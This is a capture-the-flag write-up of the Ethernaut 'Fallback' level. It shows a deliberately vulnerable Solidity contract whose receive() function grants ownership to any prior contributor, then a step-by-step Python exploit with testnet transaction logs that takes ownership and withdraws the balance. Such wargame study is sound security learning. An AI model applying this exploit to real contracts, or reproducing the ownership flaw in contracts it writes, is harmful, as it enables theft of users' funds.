# 01 - Fallback

## Challenge

Look carefully at the contract's code below.

You will beat this level if

1. you claim ownership of the contract
2. you reduce its balance to 0

Things that might help

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

## Summary

The goal is to claim ownership of the contract and reduce its balance to 0. The given contract, when deployed, will set the owner to the deployer (Ethernaut) and give them 1000 ether. There are two places where the owner can be changed:

```js
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

Each time we can contribute less than 0.001 ether, and we can only become owner if our contribution is greater than 1000 ether. This is infeasible. The other place is in the fallback function:

```js
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

I read a [nice article](https://coinsbench.com/solidity-17-payable-fallback-and-receive-d24b9f7d355f) explaining `payable`, `fallback()` and `receive()` in Solidity. To summarize,

- `payable` is a modifier that allows a function to receive ether
- `fallback()` is a function that is called when a contract receives an external message call that doesn't match any of the functions in the contract
- `receive()` is similar to the fallback function, but it is designed specifically to handle incoming ether without the need for a data call

They also put a nice flowchart to explain the conditions:

```
        Ether sent to contract
                |
          msg.data empty ?
               / \
             yes  no
            /      \
receive() exists?   fallback()
          / \
        yes  no
        /     \
  receive()  fallback()
```

In our scenario, due to `require(msg.value > 0 && contributions[msg.sender] > 0)`, we can exploit by

1. Call `contribute()` with a small amount of ether
2. Transfer some ether to the contract from our account -> `receive()` is called -> we become the owner
3. Call `withdraw()` to transfer the contract's balance to our account

## Walkthrough

We choose to use `cheb3` throughout the levels.

Include imports:

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import encode_with_signature
```

Connect to our account and the contract:

```py
>>> conn = Connection("https://bitter-purple-general.ethereum-goerli.discover.quiknode.pro/<key>")
>>> account = conn.account("<priv_key>")
# Chrome Devtool Console
# > contract.address
# < '0x26222F0D8E10362abB51729E84CEE7F0dDADAD66'
>>> contract_addr = "0x26222F0D8E10362abB51729E84CEE7F0dDADAD66"
```

Call `contribute()` with a small amount of ether: (Note convertion from ether to wei)

```py
>>> account.send_transaction(contract_addr, data=encode_with_signature("contribute()"), value=int(0.0001*10**18))
2023-06-03 09:38:11.665 | INFO     | cheb3.account:send_transaction:103 - Transaction to 0x26222F0D8E10362abB51729E84CEE7F0dDADAD66: 0x277818cd99b60d1457dfbe4159f8df99305dd03fe0dc7757ab5bba2f3ac59cae
AttributeDict({'blockHash': HexBytes('0x6e2cdb15d4aa1fc5f1f9b92d0182056be23f9036c390e835bd3635d2a96ca7c1'), 'blockNumber': 9115745, 'contractAddress': None, 'cumulativeGasUsed': 8824980, 'effectiveGasPrice': 514869820, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 47965, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x26222F0D8E10362abB51729E84CEE7F0dDADAD66', 'transactionHash': HexBytes('0x277818cd99b60d1457dfbe4159f8df99305dd03fe0dc7757ab5bba2f3ac59cae'), 'transactionIndex': 30, 'type': 0})
```

Now on Devtool, `await contract.getContribution().then(v => v.toString())` gives 100000000000000 (wei) as expected. Now transfer some ether to the contract from our account:

```py
>>> account.send_transaction(contract_addr, value=int(0.0001*10**18), gas_price=410089104)
2023-06-03 09:43:30.725 | INFO     | cheb3.account:send_transaction:103 - Transaction to 0x26222F0D8E10362abB51729E84CEE7F0dDADAD66: 0x366d6da8fe75af82a807495c0709298457a559224772630eea957286e931e636
AttributeDict({'blockHash': HexBytes('0x28aa01c3caf877a9ae042b59c547ac67b551144393f546eec4d3e3ae59b13402'), 'blockNumber': 9115770, 'contractAddress': None, 'cumulativeGasUsed': 5576048, 'effectiveGasPrice': 410089104, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 28302, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x26222F0D8E10362abB51729E84CEE7F0dDADAD66', 'transactionHash': HexBytes('0x366d6da8fe75af82a807495c0709298457a559224772630eea957286e931e636'), 'transactionIndex': 32, 'type': 0})
```

`await contract.owner()` gives '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB' which is our own account. Here I'm forced to set a custom gas price because my HTTP endpoint's default is low. infura seems to be better in this regard. I also obtained an infura endpoint `https://goerli.infura.io/v3/<key>` and will be using it in the future.

Now we just need to withdraw:

```py
>>> account.send_transaction(contract_addr, data=encode_with_signature("withdraw()"), gas_price=400829420)
2023-06-03 09:45:12.006 | INFO     | cheb3.account:send_transaction:103 - Transaction to 0x26222F0D8E10362abB51729E84CEE7F0dDADAD66: 0x1212d8dc4ace451be415a31661a86886f89443e1034ddeeaf3d3f96e56805060
AttributeDict({'blockHash': HexBytes('0xcfc62f486121055c4bf4ccbbf995c0daba1b93ae0ccd0fad23dbd6b60aae8e8c'), 'blockNumber': 9115777, 'contractAddress': None, 'cumulativeGasUsed': 10893027, 'effectiveGasPrice': 400829420, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 30364, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x26222F0D8E10362abB51729E84CEE7F0dDADAD66', 'transactionHash': HexBytes('0x1212d8dc4ace451be415a31661a86886f89443e1034ddeeaf3d3f96e56805060'), 'transactionIndex': 53, 'type': 0})
```

Submit the instance to pass the level.